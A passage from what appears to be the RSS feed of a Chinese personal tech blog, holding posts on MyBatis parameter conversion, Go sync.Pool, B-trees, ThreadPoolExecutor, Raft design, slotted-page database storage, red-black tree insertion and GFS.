&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">result&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getReturnType&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">isPrimitive&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">returnsVoid&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">BindingException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Mapper method &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">()&lt;/span>
&lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; attempted to return null from a method with a primitive return type (&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getReturnType&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;).&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 将参数转换为SQL命令参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">convertArgsToSqlCommandParam&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 这里有一个坑：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// args 是Mapper方法执行的参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// param 是编写的SQL语句所需要的命令参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 它们有什么不同呢：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 在MyBatis中你需要使用分页时可以不显式在SQL语句中使用limit命令
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 使用RowBounds对象作为Mapper的额外参数来做到数据分页
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 该参数不用在SQL语句中显式使用.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">paramCount&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">params&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">size&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">paramCount&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果没参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">hasNamedParameters&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">paramCount&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果只有一个参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">params&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">keySet&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">iterator&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">next&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">intValue&lt;/span>&lt;span class="o">()];&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//否则，返回一个ParamMap，修改参数名，参数名就是其位置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">Map&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ParamMap&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Object&lt;/span>&lt;span class="o">&amp;gt;();&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Map&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Entry&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">entry&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">params&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">entrySet&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//1.先加一个#{0},#{1},#{2}...参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">put&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getValue&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getKey&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">intValue&lt;/span>&lt;span class="o">()]);&lt;/span>
&lt;span class="c1">// issue #71, add param names as param1, param2...but ensure backward compatibility
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">genericParamName&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;param&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">valueOf&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">param&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">containsKey&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">genericParamName&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//2.再加一个#{param1},#{param2}...参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//你可以传递多个参数给一个映射器方法。如果你这样做了,
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//默认情况下它们将会以它们在参数列表中的位置来命名,比如:#{param1},#{param2}等。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//如果你想改变参数的名称(只在多参数情况下) ,那么你可以在参数上使用@Param(“paramName”)注解。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">put&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">genericParamName&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getKey&lt;/span>&lt;span class="o">()]);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="n">i&lt;/span>&lt;span class="o">++;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>OK, 我基本想说的都说完了。后续可能会额外补充一些内容，但是不会在本文中，会写新文章。&lt;/p></description></item><item><title>GoSyncPool</title><link>https://sdttttt.github.io/blog/gosyncpool/</link><pubDate>Thu, 03 Sep 2020 17:06:04 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/gosyncpool/</guid><description>
&lt;p>今天在看Sentinel-golang源码的时候发现sentinel在内部使用了sync.Pool该结构体.看到Sync和Pool的我第一反应想到应该是线程池之类的东西.在实际看过原理之后发现并不是这样的.&lt;/p>
&lt;hr>
&lt;p>sync.Pool 的目的是为了利用对象的复用来减小GC压力.但是开销比较高.要斟酌使用.&lt;/p>
&lt;p>Pool和golang的GMP协程模型的关系比较大.
sync.Pool对每一个P(系统线程)都分配了一个本地池.&lt;/p>
&lt;p>本地池中有2个属性，分别是private和share。
private只能被当前P访问，share可以被不同的P访问.&lt;/p>
&lt;p>在执行Get or Put的时候.会对应当前执行P的本地池.&lt;/p>
&lt;h4 id="get">Get&lt;/h4>
&lt;ol>
&lt;li>尝试从本地P对应的那个本地池中获取一个对象值, 并从本地池冲删除该值。&lt;/li>
&lt;li>如果获取失败，那么从共享池中获取, 并从共享队列中删除该值。&lt;/li>
&lt;li>如果获取失败，那么从其他P的共享池中偷一个过来，并删除共享池中的该值(p.getSlow())。&lt;/li>
&lt;li>如果仍然失败，那么直接通过New()分配一个返回值，注意这个分配的值不会被放入池中。New()返回用户注册的New函数的值，如果用户未注册New，那么返回nil。&lt;/li>
&lt;/ol>
&lt;h4 id="put">Put&lt;/h4>
&lt;ol>
&lt;li>如果放入的值为空，直接return.&lt;/li>
&lt;li>检查当前goroutine的是否设置对象池私有值，如果没有则将x赋值给其私有成员，并将x设置为nil。&lt;/li>
&lt;li>如果当前goroutine私有值已经被设置，那么将该值追加到共享列表。&lt;/li>
&lt;/ol></description></item><item><title>B Tree</title><link>https://sdttttt.github.io/blog/btree/</link><pubDate>Sun, 30 Aug 2020 20:41:54 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/btree/</guid><description>
&lt;p>这篇文章以数据库存储的数据结构来引出本文的重点&lt;strong>B树&lt;/strong>,以及后面还有另一种数据结构&lt;strong>B+树&lt;/strong>.&lt;/p>
&lt;p>试想, 如果你想持久化大量的数据在硬盘上, 同时还希望能高效的查询和修改他们, 你会怎么做, 使用哪种数据结构.&lt;/p>
&lt;p>数组和链表, 他们的缺点很明显, 我们寻找数据需要遍历整个数据结构, 试想一下你的数据库中有50PB的数据, 这个开销是我们无法接受的.&lt;/p>
&lt;p>哈希表, 通过给定的数据通过Hash函数生成对应的索引, 能非常高效的找到对应的数据. 但是, 哈希表不能用于范围查询.&lt;/p>
&lt;p>二叉树, 一种使用二分法作为查询算法的数据结构, 在内存中, 二叉树的效率确实非常高, 但是如果是在硬盘上, 每次读取节点, 都需要进行一次IO, 随着数据量的增大, 深度逐渐加深, 二叉树的效率就会大大降低.&lt;/p>
&lt;h2 id="b-tree">B Tree&lt;/h2>
&lt;p>B树存在一些和二叉树不一样的地方: 二叉树每个节点只保存一份数据以及两个指针, B树在每个节点都可以保留一样数量的数据和指针, 指针的数量为数据的数量+1.&lt;/p>
&lt;p>在B树中还有存在一个概念, 阶数, 它决定了该B树每个节点应该有多少数据以及指针.&lt;/p>
&lt;h3 id="rules">Rules&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>排序方式：所有节点关键字是按递增次序排列，并遵循左小右大原则；例如一个节点能存放3份数据, 该数据需要从左到右增序存放, 1, 2, 3.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>子节点数：非叶节点的子节点数&amp;gt;1，且&amp;lt;=M ，且M&amp;gt;=2，空树除外(注：M阶代表一个树节点最多有多少个查找路径，M=M路,当M=2则是2叉树,M=3则是3叉)；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>关键字数：子节点的关键字数量大于等于ceil(m/2)-1个且小于等于M-1个(注：ceil()是个朝正无穷方向取整的函数 如ceil(1.1)结果为2);&lt;/p>
&lt;/li>
&lt;li>
&lt;p>所有叶子节点均在同一层、叶子节点除了包含了关键字和关键字记录的指针外也有指向其子节点的指针只不过其指针地址都为null对应下图最后一层节点的空格子;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="find">Find&lt;/h3>
&lt;p>我们用一个图和一个实际的例子来理解B树(这里为了理解方便我就直接用实际字母的大小来排列C&amp;gt;B&amp;gt;A):&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/DataStructure/BT.jpg" alt="BT">&lt;/p>
&lt;p>如上图我要从上图中找到E字母，查找流程如下:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>获取根节点的关键字进行比较，当前根节点关键字为M，E&amp;lt;M(26个字母顺序)，所以往找到指向左边的子节点(二分法规则，左小右大，左边放小于当前节点值的子节点、右边放大于当前节点值的子节点)；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>拿到关键字D和G，D&amp;lt;E&amp;lt;G 所以直接找到D和G中间的节点；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>拿到E和F，因为E=E 所以直接返回关键字和指针信息(如果树结构里面没有包含所要查找的节点则返回null).&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="insert">Insert&lt;/h3>
&lt;p>下次更新.&lt;/p></description></item><item><title>Blog Upgrade</title><link>https://sdttttt.github.io/blog/blogupgrade/</link><pubDate>Sat, 29 Aug 2020 18:07:48 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/blogupgrade/</guid><description>
&lt;p>这几天修改了这个Blog的主题, 加载速度应该是更快了, 而且优化了整个项目的自动部署. 取消了双仓库的部署策略, 在部署任务的执行上也用上了异步.&lt;/p>
&lt;p>现在每次修改完成后的生成以及部署的速度比以前快了大概40%左右.但是访问&lt;strong>Github Page&lt;/strong>的速度还是一如既往的的满.&lt;/p></description></item><item><title>Thread Pool Executor 运行细节</title><link>https://sdttttt.github.io/blog/thread_pool_executor/</link><pubDate>Tue, 25 Aug 2020 17:29:15 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/thread_pool_executor/</guid><description>
&lt;p>先说说线程池本身, 由于线程资源本身在计算机中比较昂贵, 创建和销毁都有相当的开销, 所以在一些处理简单但是并发量大的场景使用一个请求对应一个线程的是不明智的选择.&lt;/p>
&lt;p>ThreadPoolExecutor是Java中线程池的一种实现. 构造函数如下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="kd">public&lt;/span> &lt;span class="nf">ThreadPoolExecutor&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">corePoolSize&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="c1">// 核心线程数量
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">maximumPoolSize&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="c1">// 最大线程数量
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">keepAliveTime&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="c1">// 存活时间
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">TimeUnit&lt;/span> &lt;span class="n">unit&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="c1">// 时间单位
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BlockingQueue&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Runnable&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">workQueue&lt;/span> &lt;span class="c1">// 来个列队
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">corePoolSize&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">maximumPoolSize&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">keepAliveTime&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">unit&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">workQueue&lt;/span>&lt;span class="o">,&lt;/span>
&lt;span class="n">Executors&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">defaultThreadFactory&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">defaultHandler&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>提交任务时的运行如下:&lt;/p>
&lt;ul>
&lt;li>如果正在运行的线程数 &amp;lt; coreSize，马上创建线程执行该task，不排队等待；&lt;/li>
&lt;li>如果正在运行的线程数 &amp;gt;= coreSize，把该task放入阻塞队列；&lt;/li>
&lt;li>如果队列已满 &amp;amp;&amp;amp; 正在运行的线程数 &amp;lt; maximumPoolSize，创建新的线程执行该task；&lt;/li>
&lt;li>如果队列已满 &amp;amp;&amp;amp; 正在运行的线程数 &amp;gt;= maximumPoolSize，线程池调用handler的reject方法拒绝本次提交。&lt;/li>
&lt;li>从worker线程自己的角度来看，当worker的task执行结束之后，循环从阻塞队列中取出任务执行。&lt;/li>
&lt;/ul></description></item><item><title>Raft实现的思考</title><link>https://sdttttt.github.io/blog/raft_impl/</link><pubDate>Thu, 25 Jun 2020 19:02:23 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/raft_impl/</guid><description>
&lt;p>比较Raft算法和Paxos算法之后,确实能感受到Raft算法更加接近正常人的思维逻辑, Paxos反而比较&lt;code>专业?&lt;/code>&lt;/p>
&lt;p>本文会说一些Raft算法实现上的一些考量, 我目前还没有正式开始开发Raft的实现.
文中所有的内容仅供参考.&lt;/p>
&lt;p>Raft最基础分为三种状态: &lt;strong>Leader&lt;/strong>, &lt;strong>Follower&lt;/strong>, &lt;strong>Candidate&lt;/strong>.
整个Raft主体即是一个状态机.&lt;/p>
&lt;p>每个RaftNode都需要处理外部的事件.所以我们可以采用事件驱动模型.&lt;/p>
&lt;p>整体我们可以拆分为三个部分:&lt;/p>
&lt;ul>
&lt;li>RaftProcessor: 处理事件的处理器.&lt;/li>
&lt;li>EventDispatcher: 负责接收外部任务,发送给Raft本体, 或者接收Raft本体发来的事件,向外发布.&lt;/li>
&lt;li>LogSynchronizer: 同步LogBuffer中的日志到Raft本体.&lt;/li>
&lt;/ul>
&lt;p>三个部分可以使用Channel来到达互相通信.&lt;/p>
&lt;p>&lt;img src="https://static01.imgkr.com/temp/4b34da085c8742018791aa36e4921210.jpg" alt="">&lt;/p></description></item><item><title>Kanon</title><link>https://sdttttt.github.io/blog/kanon/</link><pubDate>Fri, 12 Jun 2020 17:09:04 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/kanon/</guid><description>
&lt;iframe frameborder="no" width=330 height=86 src="//music.163.com/outchain/player?type=2&amp;id=26134218&amp;auto=1&amp;height=66">&lt;/iframe>
&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
&lt;p>有一段时间没有玩过&lt;code>GALGAME&lt;/code>了.&lt;/p>
&lt;p>所以就去尝试玩了&lt;code>Kanon&lt;/code>.&lt;/p>
&lt;p>总之就是, &lt;strong>非常后悔&lt;/strong>.&lt;/p></description></item><item><title>Database Storage</title><link>https://sdttttt.github.io/blog/database_storage/</link><pubDate>Tue, 02 Jun 2020 19:51:50 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/database_storage/</guid><description>
&lt;p>&lt;strong>CMU Database System 15-445/645&lt;/strong> 储存 Part 1&lt;/p>
&lt;p>数据库存储的数据在 FS(File System) 中是以 &lt;strong>块(Block)&lt;/strong> 的方式表示的.&lt;/p>
&lt;p>实际上你很可能已经见到过了,在MySQL中的数据库就是以一切Block文件的方式存储的.&lt;/p>
&lt;p>这篇文章会告诉你目前常见的数据库存储方式.&lt;/p>
&lt;hr>
&lt;p>最开始用&lt;strong>Tuple Storage&lt;/strong>来尝试改善数据库的存储结构.&lt;/p>
&lt;p>&lt;img src="https://imgkr.cn-bj.ufileos.com/0029ea52-6d5b-4989-a8e0-a7dec2e0d49c.png" alt="">&lt;/p>
&lt;p>它的工作原理比较简单, 每一个&lt;strong>Page&lt;/strong>维护一个&lt;strong>Header&lt;/strong>,
Header中会包含一些Page的元数据,以及被存储数据的偏移值.&lt;/p>
&lt;p>每当插入一个Tuple,我们就会Update Header中的偏移值.&lt;/p>
&lt;p>这个设计中存在比较大的问题, 如果我们删除了底下Tuple,就不得不移动所有Tuple.
如果不移动数据, 那我们也要花费高昂的代价去维护Header中Page的meta数据.&lt;/p>
&lt;hr>
&lt;p>目前最常见的就是&lt;strong>Slotted Pages&lt;/strong>的方式去存储数据.
在不同数据库中的实现细节可能不同,但是从高级层面来讲,大多数数据库系统,
用的都是这种方式去存储数据.&lt;/p>
&lt;p>&lt;img src="https://imgkr.cn-bj.ufileos.com/a47909a8-e0e6-48ea-a0b7-e3e327d7fdf2.png" alt="">&lt;/p>
&lt;p>每个Page中有三个部分:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Header&lt;/strong>: 保存最基本的matedata, 还包含一些checksum和访问时间之类的.&lt;/li>
&lt;li>&lt;strong>SlotArray&lt;/strong>: 将每一个特定的Slot映射到对应Tuple的偏移值上.&lt;/li>
&lt;li>&lt;strong>TupleArray&lt;/strong>: 储存每一个Tuple.&lt;/li>
&lt;/ul>
&lt;p>在这个结构中Header后面紧接这SoltArray, 而Tuple是从Page的尾部开始存储的.
每个Page存储的Tuple的个数是固定的.&lt;/p>
&lt;p>如果Tuple被删除,我们也只需要删除固定的Solt就行.
空出来的空间碎片,可以由数据库的空间整理功能去完成.
维护每个Tuple的成本也比较小.只需要改变Solt就可以.&lt;/p>
&lt;hr>
&lt;p>最后讲一个Demo来演示数据库的工作过程.&lt;/p>
&lt;p>假如我想要找一个叫A的人,我会先去查找索引.
从索引里我知道A的Page是123, Solt是2.
我去找管理Pages的人,让他把Page123的指针给我,
然后拿着Page的指针,找到Solt2中的偏移地址,找到了A这个人.&lt;/p></description></item><item><title>Red Black Tree</title><link>https://sdttttt.github.io/blog/red-black-tree/</link><pubDate>Mon, 25 May 2020 19:27:28 +0800</pubDate><guid>https://sdttttt.github.io/blog/red-black-tree/</guid><description>
&lt;p>半年前在研究&lt;code>HashMap&lt;/code>的时候已经学习过红黑树的规则原理了.
不过现在又遇到就忘记是怎么实现的了.(只知道这玩意是用来平衡树的)
这次就把这个数据结构做一个了断.&lt;/p>
&lt;h3 id="性质">性质&lt;/h3>
&lt;ul>
&lt;li>性质1：每个节点要么是黑色，要么是红色。&lt;/li>
&lt;li>性质2：根节点是黑色。&lt;/li>
&lt;li>性质3：每个叶子节点（NIL）是黑色。&lt;/li>
&lt;li>性质4：每个红色结点的两个子结点一定都是黑色。&lt;/li>
&lt;li>性质5：任意一结点到每个叶子结点的路径都包含数量相同的黑结点。&lt;/li>
&lt;/ul>
&lt;p>满足这5个性质就能保证红黑树是平衡的.&lt;/p>
&lt;h3 id="insert">Insert&lt;/h3>
&lt;p>插入的节点默认是红色的.因为这样可以最大限度满足红黑树的5个性质.&lt;/p>
&lt;p>请试想一下.如果插入的节点是红色:&lt;/p>
&lt;ul>
&lt;li>性质1可以满足.&lt;/li>
&lt;li>性质2可以满足.&lt;/li>
&lt;li>性质3可以满足(插入红色节点后自动衍生出2个黑色的NIL节点).&lt;/li>
&lt;li>性质4可能没法满足(新插入的节点的父节点也是红色).&lt;/li>
&lt;li>性质5可能没法满足(父节点是黑色时就不行).&lt;/li>
&lt;/ul>
&lt;p>然后是红黑树节点的左右旋.&lt;/p>
&lt;p>&lt;img src="https://gitee.com/sdttttt/images/raw/master//1323444-ff870251222c460e.gif" alt="">&lt;/p>
&lt;p>&lt;img src="https://gitee.com/sdttttt/images/raw/master//1323444-3f68be339d2a3983.gif" alt="">&lt;/p>
&lt;p>看懂没? 节点的旋转大概就是这样。&lt;/p>
&lt;p>然后就是要分插入的情况了.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一种：根节点为空。这种情况，将node的颜色改为黑色即可.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第二种: node的父节点为黑色。这种情况不需要做修改.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第三种: node的父节点为红色 (根据性质3，N的祖父节点必为黑色). 这种情况和变换规则都比较多.下面细说&amp;hellip;&lt;/p>
&lt;ul>
&lt;li>node的叔父节点为红色。这种情况，将N的父节点和叔父节点的颜色都改为黑色，若祖父节点是跟节点就将其改为黑色，否则将其颜色改为红色，并以祖父节点为插入的目标节点开始重新递归修复红黑树.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_3.png" alt="">&lt;/p>
&lt;ul>
&lt;li>node的叔父节点为黑色，且node和node的父节点在同一边 (即父节点为祖父的左儿子时，N也是父节点的左儿子。父节点为祖父节点的右儿子时。N也是父节点的右儿子)。以父节点为祖父节的左儿子为例，将父节点改为黑色，祖父节点改为红色，然后以祖父节点为基准右旋。(N为父节点右儿子时做相应的左旋)&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_5.png" alt="">&lt;/p>
&lt;ul>
&lt;li>node的叔父节点为黑色，且node和node的父节点不在同一边 (即父节点为祖父的左儿子时，N是父节点的右儿子。父节点为祖父节点的右儿子时。N也是父节点左右儿子)。以父节点为祖父节点的左儿子为例。以父节点为基准，进行左旋，然后以父节点为目标插入节点进入情况3的b情况进行操作。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_4.png" alt="">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="delete">Delete&lt;/h3>
&lt;p>这个以后再说.&lt;/p>
&lt;h3 id="search">Search&lt;/h3>
&lt;p>红黑树算是搜索二叉树的一个子集，&lt;code>Search&lt;/code>方法是相同的。&lt;/p></description></item><item><title>Tree by Rust implement</title><link>https://sdttttt.github.io/blog/tree_rust/</link><pubDate>Wed, 20 May 2020 19:14:33 +0800</pubDate><guid>https://sdttttt.github.io/blog/tree_rust/</guid><description>
&lt;p>&lt;img src="https://sdttttt.github.io/code/carbon2.png" alt="">&lt;/p></description></item><item><title>Stack by Rust implement</title><link>https://sdttttt.github.io/blog/stack_rust/</link><pubDate>Wed, 20 May 2020 19:01:23 +0800</pubDate><guid>https://sdttttt.github.io/blog/stack_rust/</guid><description>
&lt;p>&lt;img src="https://sdttttt.github.io/code/carbon.png" alt="">&lt;/p></description></item><item><title>GFS</title><link>https://sdttttt.github.io/blog/gfs/</link><pubDate>Sat, 09 May 2020 13:00:00 +0000</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/gfs/</guid><description>
&lt;p>这是 &lt;code>MIT 6.824&lt;/code> 课程&lt;code>GFS&lt;/code>部分的一些总结.&lt;/p>
&lt;p>GFS (Google File System) 是Google为了管理海量数据而开发的一个分布式文件系统.&lt;/p>
&lt;p>直接进入正题.&lt;/p>
&lt;p>在GFS中文件是以&lt;code>Chunk&lt;/code>的形式存储。所谓的&lt;code>Chunk&lt;/code>是一个储存块。一个Chunk的大小为64MB.一个文件会分为多个Chunk.储存在不同的服务器里。当然也会有2-3份&lt;code>Chunk&lt;/code>的拷贝。&lt;/p>
&lt;p>GFS中还存在一个&lt;code>Master&lt;/code>，Master收集所有文件的metadata, 保存在一张表中。&lt;/p>
&lt;p>下面简单的解释一下读操作的交互。&lt;/p>
&lt;ul>
